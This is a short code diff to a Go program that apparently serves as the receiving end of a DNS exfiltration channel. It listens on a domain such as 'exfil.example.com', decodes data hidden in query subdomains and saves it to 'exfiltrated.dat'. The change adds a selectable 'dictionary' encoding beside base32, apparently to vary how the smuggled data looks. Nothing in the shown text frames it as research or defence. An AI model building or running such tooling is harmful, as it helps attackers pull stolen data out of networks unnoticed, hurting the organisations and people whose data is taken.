@@ -55,9 +55,18 @@ func main() {
 	domain := flag.String("domain", "exfil.example.com", "Base domain to listen for")
 	port := flag.Int("port", 5353, "DNS server port (use 53 for production, requires root)")
 	output := flag.String("output", "exfiltrated.dat", "Output file for exfiltrated data")
+	encoding := flag.String("encoding", "base32", "Encoding type (base32 or dictionary)")
 	flag.Parse()
 
-	encoder := dnsencoder.NewEncoder(*domain)
+	var decoder interface {
+		DecodeFromSubdomain(string) ([]byte, int, error)
+	}
+	if *encoding == "dictionary" {
+		decoder = dnsencoder.NewDictionaryEncoder(*domain)
+	} else {
+		decoder = dnsencoder.NewEncoder(*domain)
+	}
+
 	session := NewExfilSession()
 
 	dns.HandleFunc(*domain, func(w dns.ResponseWriter, r *dns.Msg) {
@@ -67,7 +76,7 @@ func main() {
 		for _, q := range r.Question {
 			log.Printf("Received query: %s", q.Name)
 
-			data, seq, err := encoder.DecodeFromSubdomain(q.Name)
+			data, seq, err := decoder.DecodeFromSubdomain(q.Name)
 			if err != nil {
 				log.Printf("  Failed to decode: %v", err)
 				continue
